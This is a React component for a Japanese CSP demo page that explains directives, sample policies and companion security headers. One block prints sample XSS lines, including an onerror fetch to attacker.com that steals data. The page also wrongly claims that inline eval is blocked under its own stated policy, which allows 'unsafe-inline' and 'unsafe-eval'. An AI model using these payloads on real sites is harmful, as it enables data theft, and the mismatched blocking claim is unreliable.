"use client";

export default function CSPDemo() {
  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#111827",
        color: "#fff",
        padding: "2rem",
      }}
    >
      <div style={{ maxWidth: "1000px", margin: "0 auto" }}>
        <header style={{ textAlign: "center", marginBottom: "3rem" }}>
          <h1 style={{ fontSize: "2.5rem", marginBottom: "1rem" }}>
            🛡️ Content Security Policy (CSP) デモ
          </h1>
          <p style={{ color: "#ccc", fontSize: "1.1rem" }}>
            ブラウザレベルでのXSS攻撃防御メカニズム
          </p>
        </header>

        {/* CSPの説明 */}
        <div
          style={{
            backgroundColor: "#1f2937",
            padding: "2rem",
            borderRadius: "8px",
            border: "1px solid #374151",
            marginBottom: "2rem",
          }}
        >
          <h2 style={{ marginBottom: "1.5rem", color: "#3b82f6" }}>
            📋 Content Security Policy とは
          </h2>
          <p
            style={{
              color: "#d1d5db",
              lineHeight: "1.6",
              marginBottom: "1rem",
            }}
          >
            CSPは、XSS攻撃やデータインジェクション攻撃から保護するためのWebセキュリティ標準です。
            ブラウザがどのリソースの読み込みや実行を許可するかを制御できます。
          </p>

          <div
            style={{
              backgroundColor: "#374151",
              padding: "1rem",
              borderRadius: "4px",
              marginTop: "1rem",
            }}
          >
            <h4 style={{ color: "#fbbf24", marginBottom: "0.5rem" }}>
              🔍 現在のページのCSP設定:
            </h4>
            <code
              style={{
                fontSize: "0.8rem",
                color: "#e5e7eb",
                wordBreak: "break-all",
                display: "block",
              }}
            >
              default-src 'self'; script-src 'self' 'unsafe-inline'
              'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self'
              data: https:; font-src 'self' https:;
            </code>
          </div>
        </div>

        {/* CSPディレクティブの説明 */}
        <div
          style={{
            backgroundColor: "#1f2937",
            padding: "2rem",
            borderRadius: "8px",
            border: "1px solid #374151",
            marginBottom: "2rem",
          }}
        >
          <h2 style={{ marginBottom: "1.5rem", color: "#10b981" }}>
            🎯 主要なCSPディレクティブ
          </h2>

          <div style={{ display: "grid", gap: "1rem" }}>
            {[
              {
                directive: "default-src 'self'",
                description: "デフォルトで同一オリジンからのリソースのみ許可",
                color: "#10b981",
              },
              {
                directive: "script-src 'self'",
                description: "JavaScriptの実行を同一オリジンからのみ許可",
                color: "#3b82f6",
              },
              {
                directive: "style-src 'self' 'unsafe-inline'",
                description: "CSSを同一オリジンとインラインスタイルで許可",
                color: "#8b5cf6",
              },
              {
                directive: "img-src 'self' data: https:",
                description: "画像を同一オリジン、data URI、HTTPSから許可",
                color: "#f59e0b",
              },
              {
                directive: "connect-src 'self'",
                description: "Ajax、WebSocket等を同一オリジンからのみ許可",
                color: "#ef4444",
              },
            ].map((item, index) => (
              <div
                key={index}
                style={{
                  backgroundColor: "#374151",
                  padding: "1rem",
                  borderRadius: "4px",
                  border: `1px solid ${item.color}`,
                }}
              >
                <code
                  style={{
                    color: item.color,
                    fontSize: "0.9rem",
                    fontWeight: "bold",
                    display: "block",
                    marginBottom: "0.5rem",
                  }}
                >
                  {item.directive}
                </code>
                <p style={{ color: "#d1d5db", fontSize: "0.8rem", margin: 0 }}>
                  {item.description}
                </p>
              </div>
            ))}
          </div>
        </div>

        {/* CSPの効果デモ */}
        <div
          style={{
            backgroundColor: "#1f2937",
            padding: "2rem",
            borderRadius: "8px",
            border: "1px solid #374151",
            marginBottom: "2rem",
          }}
        >
          <h2 style={{ marginBottom: "1.5rem", color: "#f59e0b" }}>
            🧪 CSPによる保護効果のテスト
          </h2>

          <div style={{ marginBottom: "2rem" }}>
            <h3 style={{ color: "#fbbf24", marginBottom: "1rem" }}>
              ❌ ブロックされる危険なスクリプト例
            </h3>
            <div
              style={{
                backgroundColor: "#374151",
                padding: "1rem",
                borderRadius: "4px",
                border: "1px solid #ef4444",
              }}
            >
              <p
                style={{
                  color: "#fca5a5",
                  fontSize: "0.9rem",
                  marginBottom: "1rem",
                }}
              >
                以下のような外部スクリプトの読み込みはCSPによってブロックされます：
              </p>
              <pre
                style={{
                  backgroundColor: "#1f2937",
                  padding: "1rem",
                  borderRadius: "4px",
                  overflow: "auto",
                  fontSize: "0.8rem",
                  color: "#ef4444",
                }}
              >
                {`<!-- これらはCSPによってブロックされる -->
<script src="https://malicious-site.com/evil.js"></script>
<script>eval("alert('XSS')")</script>
<img src="x" onerror="fetch('https://attacker.com/steal-data')" />`}
              </pre>
            </div>
          </div>

          <div>
            <h3 style={{ color: "#34d399", marginBottom: "1rem" }}>
              ✅ 許可される安全なリソース例
            </h3>
            <div
              style={{
                backgroundColor: "#374151",
                padding: "1rem",
                borderRadius: "4px",
                border: "1px solid #10b981",
              }}
            >
              <p
                style={{
                  color: "#86efac",
                  fontSize: "0.9rem",
                  marginBottom: "1rem",
                }}
              >
                現在のCSP設定では以下が許可されています：
              </p>
              <pre
                style={{
                  backgroundColor: "#1f2937",
                  padding: "1rem",
                  borderRadius: "4px",
                  overflow: "auto",
                  fontSize: "0.8rem",
                  color: "#10b981",
                }}
              >
                {`<!-- これらは許可される -->
<script src="/js/app.js"></script>  <!-- 同一オリジン -->
<style>body { color: red; }</style>  <!-- インラインCSS -->
<img src="data:image/gif;base64,..." />  <!-- Data URI -->`}
              </pre>
            </div>
          </div>
        </div>

        {/* 実践的なCSP設定例 */}
        <div
          style={{
            backgroundColor: "#1f2937",
            padding: "2rem",
            borderRadius: "8px",
            border: "1px solid #374151",
            marginBottom: "2rem",
          }}
        >
          <h2 style={{ marginBottom: "1.5rem", color: "#8b5cf6" }}>
            ⚙️ 実践的なCSP設定例
          </h2>

          <div style={{ marginBottom: "2rem" }}>
            <h3 style={{ color: "#a78bfa", marginBottom: "1rem" }}>
              🔒 厳格なセキュリティ設定
            </h3>
            <pre
              style={{
                backgroundColor: "#374151",
                padding: "1rem",
                borderRadius: "4px",
                overflow: "auto",
                fontSize: "0.8rem",
                color: "#d1d5db",
              }}
            >
              {`Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-random123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.trusted.com;
  font-src 'self' https://fonts.googleapis.com;
  report-uri /csp-report;`}
            </pre>
          </div>

          <div>
            <h3 style={{ color: "#a78bfa", marginBottom: "1rem" }}>
              🛠️ 開発環境向け設定
            </h3>
            <pre
              style={{
                backgroundColor: "#374151",
                padding: "1rem",
                borderRadius: "4px",
                overflow: "auto",
                fontSize: "0.8rem",
                color: "#d1d5db",
              }}
            >
              {`Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' localhost:*;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https: http:;
  connect-src 'self' ws: wss: localhost:*;`}
            </pre>
          </div>
        </div>

        {/* CSPと他のセキュリティ対策 */}
        <div
          style={{
            backgroundColor: "#1f2937",
            padding: "2rem",
            borderRadius: "8px",
            border: "1px solid #374151",
          }}
        >
          <h2 style={{ marginBottom: "1.5rem", color: "#f472b6" }}>
            🔗 CSPと組み合わせるセキュリティ対策
          </h2>

          <div
            style={{
              display: "grid",
              gap: "1rem",
              gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))",
            }}
          >
            {[
              {
                title: "SRI (Subresource Integrity)",
                description: "外部リソースの整合性を検証",
                example:
                  '<script src="cdn.js" integrity="sha384-..." crossorigin="anonymous"></script>',
              },
              {
                title: "HTTPS Strict Transport Security",
                description: "HTTPSの強制とダウングレード攻撃の防止",
                example:
                  "Strict-Transport-Security: max-age=31536000; includeSubDomains",
              },
              {
                title: "X-Frame-Options",
                description: "クリックジャッキング攻撃の防止",
                example: "X-Frame-Options: DENY",
              },
              {
                title: "X-Content-Type-Options",
                description: "MIMEタイプスニッフィングの防止",
                example: "X-Content-Type-Options: nosniff",
              },
            ].map((item, index) => (
              <div
                key={index}
                style={{
                  backgroundColor: "#374151",
                  padding: "1rem",
                  borderRadius: "4px",
                  border: "1px solid #f472b6",
                }}
              >
                <h4 style={{ color: "#f9a8d4", marginBottom: "0.5rem" }}>
                  {item.title}
                </h4>
                <p
                  style={{
                    color: "#d1d5db",
                    fontSize: "0.8rem",
                    marginBottom: "1rem",
                  }}
                >
                  {item.description}
                </p>
                <code
                  style={{
                    fontSize: "0.7rem",
                    color: "#fbbf24",
                    backgroundColor: "#1f2937",
                    padding: "0.5rem",
                    borderRadius: "3px",
                    display: "block",
                    wordBreak: "break-all",
                  }}
                >
                  {item.example}
                </code>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
